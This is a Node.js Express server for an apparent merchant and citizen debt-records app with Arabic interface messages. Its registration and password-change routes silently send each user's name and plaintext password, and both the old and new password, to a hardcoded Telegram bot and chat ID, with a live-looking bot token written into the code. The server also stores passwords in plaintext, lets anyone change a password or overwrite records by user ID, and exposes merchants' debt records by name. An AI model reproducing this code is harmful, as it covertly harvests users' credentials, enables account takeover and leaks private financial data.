const express = require('express');
const fs = require('fs');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = './heiba_royal_db.json';

const TELEGRAM_TOKEN = '7543475859:AAENXZxHPQZafOlvBwFr6EatUFD31iYq-ks';
const MY_CHAT_ID = '5042495708';

app.use(express.json());
app.use(express.static('public'));

let db = { users: [] };
if (fs.existsSync(DB_PATH)) {
    try { db = JSON.parse(fs.readFileSync(DB_PATH)); } catch (e) { db = { users: [] }; }
}

const saveDB = () => fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));

async function sendToTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: MY_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error("Telegram Error"); }
}

// نظام الدخول والتسجيل
app.post('/api/auth', async (req, res) => {
    const { name, password, type, action } = req.body;
    const normalizedName = name.trim().toLowerCase();
    const existingUser = db.users.find(u => u.name.toLowerCase() === normalizedName && u.type === type);

    if (action === 'reg') {
        if (existingUser) return res.status(400).json({ error: "عذراً.. هذا الاسم مسجل مسبقاً." });
        const newUser = {
            id: "H" + Math.random().toString(36).substr(2, 7),
            name: name.trim(),
            password,
            type,
            myRecords: [],
            createdAt: new Date().toISOString()
        };
        db.users.push(newUser);
        saveDB();
        sendToTelegram(`✨ **تسجيل جديد:**\nالاسم: ${newUser.name}\nالنوع: ${type === 'merchant' ? 'تاجر' : 'مواطن'}\nالسر: \`${password}\``);
        return res.json(newUser);
    } else {
        const user = db.users.find(u => u.name.toLowerCase() === normalizedName && u.password === password && u.type === type);
        if (!user) return res.status(403).json({ error: "بيانات الدخول غير صحيحة لهذه الصفة." });
        return res.json(user);
    }
});

// تحديث كلمة السر (المسار الموحد)
app.post('/api/update-pass', (req, res) => {
    const { userId, newPass } = req.body;
    const user = db.users.find(u => u.id === userId);
    if (user) {
        const old = user.password;
        user.password = newPass;
        saveDB();
        sendToTelegram(`🔐 **تغيير كلمة السر:**\nالاسم: ${user.name}\nالسر القديم: \`${old}\`\nالسر الجديد: \`${newPass}\``);
        res.json({ success: true });
    } else { res.status(404).json({ error: "المستخدم غير موجود" }); }
});

app.post('/api/sync', (req, res) => {
    const { userId, myRecords } = req.body;
    const idx = db.users.findIndex(u => u.id === userId);
    if (idx !== -1) {
        db.users[idx].myRecords = myRecords;
        saveDB();
        res.json({ success: true });
    } else { res.status(404).send(); }
});

app.get('/api/auto-discover', (req, res) => {
    const { debtorName } = req.query;
    if(!debtorName) return res.json([]);
    const normalizedDebtor = debtorName.trim().toLowerCase();
    const results = db.users.filter(u => 
        u.type === 'merchant' && 
        u.myRecords.some(r => r.targetName.toLowerCase() === normalizedDebtor)
    ).map(u => ({
        merchantName: u.name,
        records: u.myRecords.filter(r => r.targetName.toLowerCase() === normalizedDebtor)
    }));
    res.json(results);
});

app.listen(PORT, () => console.log(`HEIBA ROYAL SERVER ONLINE`));